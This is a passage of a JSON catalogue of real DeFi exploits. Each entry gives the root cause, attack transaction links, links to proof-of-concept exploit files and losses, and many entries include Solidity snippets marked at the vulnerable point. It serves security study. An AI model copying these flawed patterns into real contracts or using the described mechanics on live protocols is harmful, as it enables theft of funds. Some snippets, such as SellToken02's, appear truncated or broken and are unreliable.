        "attack_tx": "https://etherscan.io/tx/0xaee0f8d1235584a3212f233b655f87b89f22f1d4890782447c4ef742b37af58d",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/CompoundUni_exp.sol",
        "analysis": "https://twitter.com/0xLEVI104/status/1762092203894276481",
        "Lost": "439,537 USD"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20230924",
        "title": "KubSplit",
        "root_cause": "Kub/Kub-split experienced a flash loan exploit, allowing the attacker to gain approximately $78.4k through pool manipulation.",
        "attack_tx": "https://bscscan.com/tx/0x2b0877b5495065e90d956e44ffde6aaee5e0fcf99dd3c86f5ff53e33774ea52d",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/Kub_Split_exp.sol",
        "analysis": "https://twitter.com/CertiKAlert/status/1705966214319612092",
        "Lost": "$78K"
    },
    {
        "type": "Arbitrary call, Insufficient validation",
        "date": "20240412",
        "title": "FIL314",
        "root_cause": "Arbitrary call",
        "attack_tx": [
            "https://bscscan.com/tx/0x051276afa96f2a2bd2ac224339793d82f6076f76ffa8d1b9e6febd49a4ec11b2",
            "https://app.blocksec.com/explorer/tx/bsc/0x051276afa96f2a2bd2ac224339793d82f6076f76ffa8d1b9e6febd49a4ec11b2"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/FIL314_exp.sol",
        "analysis": [
            "https://x.com/Phalcon_xyz/status/1779843813151739918"
        ],
        "vulnerable_code": "https://bscscan.com/address/0x80a0d7a6fd2a22982ce282933b384568e5c852bf#code",
        "lost": "14 BNB",
        "vulnerable_code_snippet": "function swap(\n    address tokenAddr,\n    uint256 amount,\n    address target,\n    address receiveToken,\n    address receiver,\n    uint256 minAmount,\n    bytes calldata callData,\n    bytes calldata order\n) external payable nonReentrant whenNotPaused {\n    _checkVaultOut(tokenAddr, amount, order);\n    require(\n        target != address(this) && target != address(0),\n        \"MP: target is invalid\"\n    );\n    require(callData.length > 0, \"MP: calldata is empty\");\n    require(receiveToken != address(0), \"MP: receiveToken is empty\");\n    require(receiver != address(0), \"MP: receiver is empty\");\n    require(minAmount > 0, \"MP: minAmount is empty\");\n\n    uint256 old_balance = _balanceOfSelf(receiveToken);\n    if (tokenAddr == NATIVE) {\n        require(amount == msg.value, \"MP: amount is invalid\");\n        target.functionCallWithValue(\n            callData,   <--vulnerable point\n            amount,\n            \"MP: CallWithValue failed\"\n        );\n    } else {\n        IERC20(tokenAddr).safeTransferFrom(\n            _msgSender(),\n            address(this),\n            amount\n        );\n        if (IERC20(tokenAddr).allowance(address(this), target) < amount) {\n            IERC20(tokenAddr).safeApprove(target, MAX_UINT256);\n        }\n        target.functionCall(callData, \"MP: FunctionCall failed\");   <--vulnerable point\n    }\n\n    uint256 _amountOut = 0;\n\n    uint256 new_balance = _balanceOfSelf(receiveToken);\n    require(\n        new_balance > old_balance,\n        \"MP: receive amount should above zero\"\n    );\n    _amountOut = new_balance - old_balance;\n\n    require(_amountOut >= minAmount, \"MP: receive amount not enough\");\n    if (receiveToken == NATIVE) {\n        TransferHelper.safeTransferNative(receiver, _amountOut);\n    } else {\n        IERC20(receiveToken).safeTransfer(receiver, _amountOut);\n    }\n\n    _orderID++;\n    emit LogVaultOut(\n        receiveToken,\n        _msgSender(),\n        _orderID,\n        _amountOut,\n        receiver,\n        order\n    );\n}"
    },
    {
        "type": "ERC20, Miscalculation",
        "date": "20221020",
        "lost": "16 BNB",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20221020-health---transfer-logic-flaw",
        "title": "HEALTH",
        "root_cause": "Incorrect calculation. Attacker can perform price manipulation by transferring HEALTH token 999 times to reduce HEALTH token in uniswap pair.",
        "vulnerable_code": "https://bscscan.com/address/0x32B166e082993Af6598a89397E82e123ca44e74E#code#L799",
        "attack_tx": null,
        "analysis": "Attacker can perform price manipulation by transferring HEALTH token 999 times to reduce HEALTH token in uniswap pair.\n\n```solidity\nfunction _transfer(address from, address to, uint256 value) private {\n        require(value <= _balances[from]);\n        require(to != address(0));\n        \n        uint256 contractTokenBalance = balanceOf(address(this));\n\n        bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;\nif ( \noverMinTokenBalance &&\n            !inSwapAndLiquify &&\n            to == uniswapV2Pair &&\n            swapAndLiquifyEnabled\n        ) {\n            contractTokenBalance = numTokensSellToAddToLiquidity;\n            //add liquidity\nswapAndLiquify(contractTokenBalance);\n        }\nif (block.timestamp >= pairStartTime.add(jgTime) && pairStartTime != 0) {\n            if (from != uniswapV2Pair) {\n                uint256 burnValue = _balances[uniswapV2Pair].mul(burnFee).div(1000);  **//vulnerable point**\n                _balances[uniswapV2Pair] = _balances[uniswapV2Pair].sub(burnValue);  **//vulnerable point**\n                _balances[_burnAddress] = _balances[_burnAddress].add(burnValue);  **//vulnerable point**\n                if (block.timestamp >= pairStartTime.add(jgTime)) {\n                    pairStartTime += jgTime;\n                }\n                emit Transfer(uniswapV2Pair,_burnAddress, burnValue);\n                IPancakePair(uniswapV2Pair).sync();\n            }\n        }",
        "vulnerable_code_snippet":"function _transfer(address from, address to, uint256 value) private {\n        require(value <= _balances[from]);\n        require(to != address(0));\n        \n        uint256 contractTokenBalance = balanceOf(address(this));\n\n        bool overMinTokenBalance = contractTokenBalance >= numTokensSellToAddToLiquidity;\nif ( \noverMinTokenBalance &&\n            !inSwapAndLiquify &&\n            to == uniswapV2Pair &&\n            swapAndLiquifyEnabled\n        ) {\n            contractTokenBalance = numTokensSellToAddToLiquidity;\n            //add liquidity\nswapAndLiquify(contractTokenBalance);\n        }\nif (block.timestamp >= pairStartTime.add(jgTime) && pairStartTime != 0) {\n            if (from != uniswapV2Pair) {\n                uint256 burnValue = _balances[uniswapV2Pair].mul(burnFee).div(1000);  **//vulnerable point**\n                _balances[uniswapV2Pair] = _balances[uniswapV2Pair].sub(burnValue);  **//vulnerable point**\n                _balances[_burnAddress] = _balances[_burnAddress].add(burnValue);  **//vulnerable point**\n                if (block.timestamp >= pairStartTime.add(jgTime)) {\n                    pairStartTime += jgTime;\n                }\n                emit Transfer(uniswapV2Pair,_burnAddress, burnValue);\n                IPancakePair(uniswapV2Pair).sync();\n            }\n        }"
    },
    {
        "type": "Incorrect logic, skim",
        "date": "20230525",
        "lost": "$42k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/GPT_exp.sol",
        "title": "GPT Token",
        "root_cause": "Fee Mechanism issue",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0xb77cb34cd01204bdad930d8c172af12462eef58dea16199185b77147d6533391",
        "analysis": "https://twitter.com/Phalcon_xyz/status/1661424685320634368",
        "vulnerable_code_snippet": "function transferFrom(address _from, address _to, uint256 _value) {\n    require(balanceOf[_from] >= _value, \"Insufficient balance\");\n    require(allowance[_from][msg.sender] >= _value, \"Not allowed\");\n    if (_to == swapLPAddr) {sellBurnToken(_value);}\n    balanceOf[_from] -= _value;\n    balanceOf[_to] += _value;\n    allowance[_from][msg.sender] -= _value;\n    emit Transfer(_from, _to, _value);\n    return true;\n}"
    },
    {
        "type": "Price Manipulation",
        "date": "20230801",
        "title": "NeutraFinance",
        "root_cause": "The root cause of the attack lay in the spot price utilized within the conversion function. This stemmed from the existence of two pools sharing the same LP token name (CMLT-LP), allowing conversion between them\u2014specifically, from one pool (CMLT-LP-65eb) to another (CMLT-LP-2ea3) via the conversion function.",
        "attack_tx": "https://explorer.phalcon.xyz/tx/arbitrum/0x6301d4c9f7ac1c96a65e83be6ea2fff5000f0b1939ad24955e40890bd9fe6122",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/NeutraFinance_exp.sol",
        "analysis": "https://twitter.com/phalcon_xyz/status/1686654241111429120?s=46&t=Oc_WAGUoXqc9c0LidD-zww",
        "vulnerable_code_snippet": "function convert(uint256 _amount) external whenNotPaused {\n    inputToken.transferFrom(msg.sender, address(this), _amount);\n    uint256 amountOut = getAmountOut(_amount);\n    require(outputToken.balanceOf(address(this)) >= amountOut, \"not enough output token\");\n    outputToken.transfer(msg.sender, amountOut);\n    emit Converted(msg.sender, _amount, amountOut);\n}\n\nfunction getAmountOut(uint256 _amount) view public returns (uint256) {\n    (uint256 reserves0, uint256 reserves1,) = inputToken.getReserves();\n    uint256 inputTotalSupply = inputToken.totalSupply();\n\n    uint256 pairTokenAmount;\n    if (pairTokenAmount == inputToken.token0()) {\n        pairTokenAmount = reserves0 * _amount / inputTotalSupply;\n    } else {\n        pairTokenAmount = reserves1 * _amount / inputTotalSupply;\n    }\n\n    (uint256 reserves2, uint256 reserves3,) = outputToken.getReserves();\n    uint256 outputTotalSupply = outputToken.totalSupply();\n\n    if (pairTokenAmount == outputToken.token0()) {\n        return outputTotalSupply * pairTokenAmount / reserves2;\n    } else {\n        return outputTotalSupply * pairTokenAmount / reserves3;\n    }\n}"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20240104",
        "title": "Gamma",
        "root_cause": "The primary issue stemmed from the deposit proxy settings related to the price change threshold, which were set excessively high. This oversight allowed for significant price fluctuations of -50% to +100% in certain LST and stablecoin vaults. The attacker exploited this flaw by targeting these specific vaults.",
        "lost": "6.3M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/Gamma_exp.sol",
        "attack_tx": "https://arbiscan.io/tx/0x025cf2858723369d606ee3abbc4ec01eab064a97cc9ec578bf91c6908679be75",
        "analysis": "https://medium.com/neptune-mutual/how-was-gamma-protocol-exploited-6b63e6c127ba",
        "vulnerable_code_snippet": "function deposit(uint256 deposit0, uint256 deposit1, address to, address from, uint256[4] memory inMin) external nonReentrant returns (uint256 shares) {\n  require(deposit0 > 0 || deposit1 > 0);\n  require(deposit0 <= deposit0Max && deposit1 <= deposit1Max);\n  require(to != address(0) && to != address(this), \"to\");\n  require(msg.sender == whitelistedAddress, \"WHE\");\n\n  /// update fees\n  zeroBurn();\n\n  (uint160 sqrtPrice, , , , , , , ) = pool.globalState();\n  uint256 price = FullMath.mulDiv(uint256(sqrtPrice).mul(uint256(sqrtPrice)), PRECISION, 2 ** (96 * 2));\n\n  (uint256 pool0, uint256 pool1) = getTotalAmounts();\n\n  shares = deposit1.add(deposit0.mul(price).div(PRECISION));\n\n  if (deposit0 > 0) {\n    token0.safeTransferFrom(from, address(this), deposit0);\n  }\n  if (deposit1 > 0) {\n    token1.safeTransferFrom(from, address(this), deposit1);\n  }\n\n  uint256 total = totalSupply();\n  if (total != 0) {\n    uint256 pool0PricedInToken1 = pool0.mul(price).div(PRECISION);\n    shares = shares.mul(total).div(pool0PricedInToken1.add(pool1));\n    if (directDeposit) {\n      uint128 liquidity = _liquidityForAmounts(baseLower, baseUpper, token0.balanceOf(address(this)), token1.balanceOf(address(this)));\n      _mintLiquidity(baseLower, baseUpper, liquidity, address(this), inMin[0], inMin[1]);\n      liquidity = _liquidityForAmounts(limitLower, limitUpper, token0.balanceOf(address(this)), token1.balanceOf(address(this)));\n      _mintLiquidity(limitLower, limitUpper, liquidity, address(this), inMin[2], inMin[3]);\n    }\n  }\n  _mint(to, shares);\n  emit Deposit(from, to, shares, deposit0, deposit1);\n  /// Check total supply cap not exceeded. A value of 0 means no limit.\n  require(maxTotalSupply == 0 || total <= maxTotalSupply, \"max\");\n}"
    },
    {
        "type": "Oracle, lending",
        "date": "20230112",
        "lost": "$80k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/RoeFinance_exp.sol",
        "title": "RoeFinance",
        "root_cause": "The root cause is the limited liquidity of the pool, which resulted in the manipulation of the price oracle.",
        "vulnerable_code_snippet": "function borrow(\n    address asset,\n    uint256 amount,\n    uint256 interestRateMode,\n    uint16 referralCode,\n    address onBehalfOf\n) external override whenNotPaused {\n    DataTypes.ReserveData storage reserve = _reserves[asset];\n\n    _executeBorrow(\n      ExecuteBorrowParams(\n        asset,\n        msg.sender,\n        onBehalfOf,\n        amount,\n        interestRateMode,\n        reserve.aTokenAddress,\n        referralCode,\n        true\n      )\n    );\n}\n\nfunction _executeBorrow(ExecuteBorrowParams memory vars) internal {\n    DataTypes.ReserveData storage reserve = _reserves[vars.asset];\n    DataTypes.UserConfigurationMap storage userConfig = _usersConfig[vars.onBehalfOf];\n\n    address oracle = _addressesProvider.getPriceOracle();\n\n    uint256 amountInETH =\n      IPriceOracleGetter(oracle).getAssetPrice(vars.asset).mul(vars.amount).div(\n        10**reserve.configuration.getDecimals()\n      );\n\n    ValidationLogic.validateBorrow(\n      vars.asset,\n      reserve,\n      vars.onBehalfOf,\n      vars.amount,\n      amountInETH,\n      vars.interestRateMode,\n      _maxStableRateBorrowSizePercent,\n      _reserves,\n      userConfig,\n      _reservesList,\n      _reservesCount,\n      oracle\n    );\n\n    reserve.updateState();\n\n    uint256 currentStableRate = 0;\n\n    bool isFirstBorrowing = false;\n    if (DataTypes.InterestRateMode(vars.interestRateMode) == DataTypes.InterestRateMode.STABLE) {\n      currentStableRate = reserve.currentStableBorrowRate;\n\n      isFirstBorrowing = IStableDebtToken(reserve.stableDebtTokenAddress).mint(\n        vars.user,\n        vars.onBehalfOf,\n        vars.amount,\n        currentStableRate\n      );\n    } else {\n      isFirstBorrowing = IVariableDebtToken(reserve.variableDebtTokenAddress).mint(\n        vars.user,\n        vars.onBehalfOf,\n        vars.amount,\n        reserve.variableBorrowIndex\n      );\n    }\n\n    if (isFirstBorrowing) {\n      userConfig.setBorrowing(reserve.id, true);\n    }\n\n    reserve.updateInterestRates(\n      vars.asset,\n      vars.aTokenAddress,\n      0,\n      vars.releaseUnderlying ? vars.amount : 0\n    );\n\n    if (vars.releaseUnderlying) {\n      IAToken(vars.aTokenAddress).transferUnderlyingTo(vars.user, vars.amount);\n    }\n\n    emit Borrow(\n      vars.asset,\n      vars.user,\n      vars.onBehalfOf,\n      vars.amount,\n      vars.interestRateMode,\n      DataTypes.InterestRateMode(vars.interestRateMode) == DataTypes.InterestRateMode.STABLE\n        ? currentStableRate\n        : reserve.currentVariableBorrowRate,\n      vars.referralCode\n    );\n}",
        "attack_tx": "https://etherscan.io/tx/0x927b784148b60d5233e57287671cdf67d38e3e69e5b6d0ecacc7c1aeaa98985b",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1612701106982862849",
            "https://quillaudits.medium.com/decoding-roe-finances-flash-loan-exploit-quillaudits-df8494e2090f#:~:text=On%20the%2011th%20of%20January,the%20loss%20of%20%2480K",
            "https://blog.solidityscan.com/roe-finance-hack-analysis-price-manipulation-6993fbea0d7c"
        ]
    },
    {
        "type": "Precision",
        "date": "20231110",
        "title": "Raft_fi",
        "root_cause": "Through `donation` and `self-liquidation`, the variable `collateralIndex` could be manipulated, thus the calculation for minted share amount could be manipulated via precision loss. The minting in `rcbETH-c` uses rounding-up, which could mint `1` share instead of `0` when dust of amount collateral is added. With shares of `cbETH`,  attacker could redeem the shares for profits.",
        "attack_tx": "https://etherscan.io/tx/0xfeedbf51b4e2338e38171f6e19501327294ab1907ab44cfd2d7e7336c975ace7",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/Raft_exp.sol",
        "analysis": "https://x.com/BlockSecTeam/status/1723229393529835972"
    },
    {
        "type": "Arbitrary call, Dex/AMM",
        "date": "20230217",
        "title": "Dexible",
        "lost": "$1.5M",
        "root_cause": "Arbitrary External Call allowing an attacker to steal a user's approved funds.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Dexible_exp.sol",
        "attack_tx": "https://etherscan.io/tx/0x138daa4cbeaa3db42eefcec26e234fc2c89a4aa17d6b1870fc460b2856fd11a6",
        "analysis": [
            "https://twitter.com/peckshield/status/1626493024879673344",
            "https://twitter.com/MevRefund/status/1626450002254958592"
        ],
        "vulnerable_code_snippet": "function fill(SwapTypes.SwapRequest calldata request, SwapMeta memory meta) external onlySelf returns (SwapMeta memory) {\n    preCheck(request, meta);\n    meta.outAmount = request.tokenOut.token.balanceOf(address(this));\n\n    for (uint i = 0; i < request.routes.length; ++i) {\n        SwapTypes.RouterRequest calldata rr = request.routes[i];\n        IERC20(rr.routeAmount.token).safeApprove(rr.spender, rr.routeAmount.amount);\n        (bool s, ) = rr.router.call(routerData); //Vulnerable Point: The attacker can make an arbitrary external call from the contract.\n\n        if (!s) {\n            revert(\"Failed to swap\");\n        }\n    }\n}"
    },
    {
        "type": "Flashloans",
        "date": "20240130",
        "lost": "6,5M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-01/MIMSpell2_exp.sol",
        "title": "MIMSpell",
        "root_cause": "The attack exploited an accuracy issue in calculating loan variables, allowing manipulation of key variables elastic and base. This imbalance led to errors in collateral and loan amount calculations, resulting in excessive lending of MIM tokens.",
        "attack_tx": "https://phalcon.blocksec.com/explorer/tx/eth/0x26a83db7e28838dd9fee6fb7314ae58dcc6aee9a20bf224c386ff5e80f7e4cf2",
        "analysis": "https://twitter.com/kankodu/status/1752581744803680680",
        "vulnerable_code_snippet": "function _borrow(address to, uint256 amount) internal returns (uint256 part, uint256 share) {\n        uint256 feeAmount = amount.mul(BORROW_OPENING_FEE) / BORROW_OPENING_FEE_PRECISION; // A flat % fee is charged for any borrow\n        (totalBorrow, part) = totalBorrow.add(amount.add(feeAmount), true);\n\n        BorrowCap memory cap =  borrowLimit;\n\n        require(totalBorrow.elastic <= cap.total, \"Borrow Limit reached\");\n\n        accrueInfo.feesEarned = accrueInfo.feesEarned.add(uint128(feeAmount));\n        \n        uint256 newBorrowPart = userBorrowPart[msg.sender].add(part);\n        require(newBorrowPart <= cap.borrowPartPerAddress, \"Borrow Limit reached\");\n        _preBorrowAction(to, amount, newBorrowPart, part);\n\n        userBorrowPart[msg.sender] = newBorrowPart;\n\n        // As long as there are tokens on this contract you can 'mint'... this enables limiting borrows\n        share = bentoBox.toShare(magicInternetMoney, amount, false);\n        bentoBox.transfer(magicInternetMoney, address(this), to, share);\n\n        emit LogBorrow(msg.sender, to, amount.add(feeAmount), part);\n    }"
    },
    {
        "type": "Access Control",
        "date": "20221122",
        "title": "AurumNodePool (AUR)",
        "root_cause": "Incorrect access control. The changeRewardPerNode function lacks proper access control validation, which allows an attacker to call this function and set any value. The attacker first calls the changeRewardPerNode function to set the daily reward value to an extremely large number. Subsequently, the attacker calls the claimNodeReward function to extract the node reward, which is calculated based on the rewardPerDay value that the attacker has set.",
        "attack_tx": [
            "https://phalcon.blocksec.com/tx/bsc/0xb3bc6ca257387eae1cea3b997eb489c1a9c208d09ec4d117198029277468e25d",
            "https://phalcon.blocksec.com/tx/bsc/0x7f031e8543e75bd5c85168558be89d2e08b7c02a32d07d76517cdbb10e279782"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/AUR_exp.sol",
        "analysis": [
            "https://twitter.com/AnciliaInc/status/1595142246570958848",
            "https://quillaudits.medium.com/hackers-steal-42m-from-fenbushi-capital-founders-wallet-dcce2b0a4e5b"
        ],
        "lost": "$13k",
        "vulnerable_code_snippet": "function changeRewardPerNode(uint256 _rewardPerDay) external { //vulnerable point - Incorrect access control\n    rewardPerDay = _rewardPerDay;\n}"
    },
    {
        "type": "Access Control",
        "date": "20230703",
        "title": "AzukiDAO",
        "root_cause": "The contract recorded the extracted signature, but did not verify the signature. As long as the passed parameters remain unchanged, multiple extractions can be achieved before the signature time limit expires, causing the attacker to use one signature to perform multiple token extraction operations.",
        "attack_tx": "https://etherscan.io/tx/0x6233c9315dd3b6a6fcc7d653f4dca6c263e684a76b4ad3d93595e3b8e8714d34",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/AzukiDAO_exp.sol",
        "analysis": "https://twitter.com/sharkteamorg/status/1676892088930271232",
        "lost": "$69k",
        "vulnerable_code_snippet": "function claim(\n    address[] memory _contracts,\n    uint256[] memory _amounts,\n    uint256[] memory _tokenIds,\n    uint256 _claimAmount,\n    bytes memory _signature,\n    uint256 endTime\n) external nonPaused nonReentrant {\n    // check length\n    require(_contracts.length == _amounts.length, \"contracts length not match amounts length\");\n\n    // check contracts\n    for (uint256 i = 0; i < _contracts.length; i++) {\n        require(contractSupports[_contracts[i]], \"contract not support\");\n    }\n\n    uint256 totalAmount;\n    for (uint256 j = 0; j < _amounts.length; j++) {\n        totalAmount += _amounts[j];\n    }\n    require(totalAmount == _tokenIds.length, \"total amount not match tokenId length\");\n\n    // check signature\n    bytes32 message = keccak256(abi.encodePacked(msg.sender, _contracts, _tokenIds, _claimAmount, endTime));\n    require(signatureManager == message.toEthSignedMessageHash().recover(_signature, \"invalid signature\");\n    require(block.timestamp <= endTime, \"signature expired\");\n\n    // check NFT\n    uint256 endIndex;\n    for (uint256 i = 0; i < _amounts.length; i++) {\n        endIndex = startIndex + _amounts[i];\n    }\n\n    for (uint256 j = startIndex; j < endIndex; j++) {\n        address contractAddr = _contracts[i];\n        address tokenId = _tokenIds[j];\n        require(ERC721(contractAddr).ownerOf(tokenId) == msg.sender, \"not owner\");\n        tokenClaimed[contractAddr][tokenId] = true;\n    }\n    startIndex = endIndex;\n    signatureClaimed[_signature] = true;\n    // transfer token\n    _transfer(address(this), msg.sender, _claimAmount);\n}"
    },
    {
        "type": "Price Manipulation",
        "date": "20230513",
        "lost": "$197k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/SellToken_exp.sol",
        "title": "SellToken02",
        "root_cause": "The flaw in the token price calculation allowed malicious actors to manipulate the price of the token, leading to significant losses for users and potentially creating an opportunity for the attackers to profit unfairly. KALOS: This type of vulnerability occurs through the ShortStart() function of SellToken.Router, specifically due to an issue with the getToken2Price() function used internally. This function retrieves the token price from PancakeSwap’s Router and utilizes it. The attacker leveraged a flash loan to borrow a significant amount of funds and executed an Inflation Attack using this method.",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1657324561577435136",
            "https://twitter.com/kalos_security/status/1668092971483561985"
        ],
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0x7d04e953dad4c880ad72b655a9f56bc5638bf4908213ee9e74360e56fa8d7c6a",
        "vulnerable_code": "https://bscscan.com/address/0x57db19127617b77c8abd9420b5a35502b59870d6#code",
        "vulnerable_code_snippet": "function ShortStart(address coin, address addr, uint terrace) payable public {\n    address bnbOrUsdt = mkt.getPair(coin);\n    require(terraces;\n        routePath;\n        routePath[0] = token;\n        routePath[1] = isbnb;\n        routePath[2] = _WBNB;\n        return IRouter(_router).getAmountsOut(bnb, routePath)[2]; // vulnerable point\n    }\n}"
    },
    {
        "type": "Insufficient validation",
        "date": "20240716",
        "title": "Lifiprotocol",
        "root_cause": "Arbitrary call. The internal swap() function would call out to any address using whatever message the attacker passed in. This allowed the attacker to have the contract transferFrom() out the funds from anyone who had approved the contract",
        "attack_tx": "https://app.blocksec.com/explorer/tx/eth/0xd82fe84e63b1aa52e1ce540582ee0895ba4a71ec5e7a632a3faa1aff3e763873",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/Lifiprotocol_exp.sol",
        "analysis": "https://x.com/danielvf/status/1505689981385334784",
        "lost": "$10M",
        "vulnerable_code_snippet": "function swap(bytes32 transactionId, SwapData calldata _swapData) internal {\n    uint256 fromAmount = _swapData.fromAmount;\n    uint256 toAmount = LibAsset.getBalance(_swapData.receivingAssetId);\n    address fromAssetId = _swapData.sendingAssetId;\n    if (LibAsset.isNativeAsset(fromAssetId) && LibAsset.getOwnBalance(fromAssetId) < fromAmount) {\n        LibAsset.transferFromERC20(_swapData.sendingAssetId, msg.sender, address(this), fromAmount);\n    }\n\n    if (!LibAsset.isNativeAsset(fromAssetId)) {\n        LibAsset.approveERC20(IERC20(fromAssetId), _swapData.approveTo, fromAmount);\n    }\n\n    // solhint-disable-next-line avoid-low-level-calls\n    bool success;\n    bytes memory res = _swapData.call({ value: msg.value } ); // Vulnerable point\n    if (!success) {\n        string memory reason = LibUtil.getRevertMsg(res);\n        revert(reason);\n    }\n}"
    },
    {
        "type": "Incorrect logic",
        "date": "20240321",
        "lost": "4.8M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/SSS_exp.sol",
        "title": "SSS",
        "root_cause": "Simple logic error `transferFrom(me, me, amount)` will multiply the balance.",
        "attack_tx": "https://blastscan.io/tx/0x62e6b906bb5aafdc57c72cd13e20a18d2de3a4a757cd2f24fde6003ce5c9f2c6",
        "analysis": [
            "https://twitter.com/SSS_HQ/status/1771054306520867242",
            "https://twitter.com/dot_pengun/status/1770989208125272481"
        ],
        "vulnerable_code_snippet": "function _update(address from, address to, uint256 amount) internal override virtual {\n    // don't check if it is minting or burning\n    if (from == address(0) || to == address(0) || to == address(0xdead)) {\n        super._update(from, to, amount);\n        return;\n    }\n\n    _botCheck(from, to);\n    uint256 fromBalanceBeforeTransfer = _preCheck(from, to, amount);\n\n    uint256 amountAfterTax = amount - _taxApply(from, to, amount);\n    uint256 toBalance = _postCheck(from, to, amountAfterTax);\n\n    _balances[from] = fromBalanceBeforeTransfer - amount;\n    _balances[to] = toBalance;\n\n    _unlockTokenForDev(from, to, amount);\n\n    emit Transfer(from, to, amountAfterTax);\n}"
    },
    {
        "type": "Bad randomness",
        "date": "20220824",
        "title": "LuckeyTiger",
        "root_cause": "bad randomness, we can predict it for infinite minting",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220824-luckeytiger-nft---predicting-random-numbers",
        "analysis": "Due to bad randomness we can predict it for infinite minting.",
        "vulnerable_code": "function _getRandom() private returns(bool) {\n        uint256 random = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp))); //vulnerable point\n        uint256 rand = random%2;\n        if(rand == 0){return lucky = false;} \nelse         {return lucky = true;}\n    }"
    },
    {
        "type": "Insufficient validation, Reentrancy",
        "date": "20231216",
        "lost": "$2M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-12/GoodDollar_exp.sol",
        "title": "GoodDollar",
        "root_cause": "_stakingContracts lack of Input Validation & Reentrancy",
        "vulnerable_code": "https://www.oklink.com/es-la/eth/address/0x0c... ",
        "attack_tx": [
            "https://www.oklink.com/es-la/eth/tx/0x726459a46839c915ee2fb3d8de7f986e3c7391c605b7a622112161a84c7384d0",
            "https://app.blocksec.com/explorer/tx/eth/0x726459a46839c915ee2fb3d8de7f986e3c7391c605b7a622112161a84c7384d0"
        ],
        "analysis": "https://x.com/MetaSec_xyz/status/1736428284756607386",
        "images": [
            "Untitled.png",
            "Screenshot 2024-06-21 at 2.27.32\u202fPM.png"
        ],
        "vulnerable_code_snippet": "function collectInterest(\n    address[] calldata _stakingContracts, // 1. Lack of validation for untrusted user input\n    bool _forceAndWaiverRewards\n) external {\n    uint256 currentBalance = daiToken.balanceOf(reserveAddress);\n    uint256 startingCDAIBalance = iToken.balanceOf(reserveAddress);\n    for (uint256 i = _stakingContracts.length; i > 0; i--) {\n        if (_stakingContracts[i - 1] != address(0x0)) {\n            IGoodStaking(_stakingContracts[i - 1]).collectUBIInterest(\n                reserveAddress\n            );\n        }\n    }\n    // 2. Reentrancy to manipulated iToken.balanceOf(reserveAddress)\n    uint256 daiToConvert = daiToken.balanceOf(reserveAddress) - currentBalance;\n\n    // 3. Interest is boosted due to manipulated iToken.balanceOf(reserveAddress)\n    (gdUBI, interestInCdai) = GoodReserveCDai(reserveAddress).mintUBI(\n        daiToConvert,\n        startingCDAIBalance,\n        iToken\n    );\n}"
    },
    {
        "type": "Access Control, Insufficient validation",
        "date": "20231022",
        "title": "OpenLeverage",
        "root_cause": "The initialize function in the upgradeable proxy lacks access control, allowing an attacker to re-initialize the proxy, become the owner of the contract, and withdraw all the tokens as a reward.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/OpenLeverage_exp.sol",
        "attack_tx": "https://bscscan.com/tx/0xd88f26f2f9145fa413db0cfd5d3eb121e3a50a3fdcee16c9bd4731e68332ce4b",
        "analysis": "https://defimon.xyz/exploit/bsc/0x5366c6ba729d9cf8d472500afc1a2976ac2fe9ff",
        "lost": "$8K",
        "vulnerable_code_snippet": "function initialize(address payable _admin, address _distributor, uint64 _defaultExpireDuration) public {\n    require(_defaultExpireDuration > 0, \"Incorrect inputs\");\n    admin = _admin;\n    distributor = _distributor;\n    defaultExpireDuration = _defaultExpireDuration;\n}"
    },
    {
        "type": "Price Manipulation",
        "date": "20230908",
        "title": "APIG",
        "root_cause": "By taking advantage of a miscalculation on the token contract , the attacker was able to manipulate the price of the token across multiple different pairs of the token",
        "attack_tx": "https://bscscan.com/tx/0x66dee84591aeeba6e5f31e12fe728f2ddc79a06426036793487a980c3b952947",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/APIG_exp.sol",
        "analysis": "https://twitter.com/CertiKAlert/status/1700128158647734745",
        "lost": "$169K"
    },
    {
        "type": "Reentrancy",
        "date": "20230711",
        "lost": "$452k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Libertify_exp.sol",
        "title": "Libertify",
        "root_cause": "`deposit()` function lack of reentrancy protection, which allows the hacker to mint more shares via re-entering `deposit()` routine.",
        "attack_tx": "https://polygonscan.com/tx/0x7320accea0ef1d7abca8100c82223533b624c82d3e8d445954731495d4388483",
        "analysis": [
            "https://twitter.com/peckshield/status/1678688731908411393",
            "https://twitter.com/Phalcon_xyz/status/1678694679767031809"
        ],
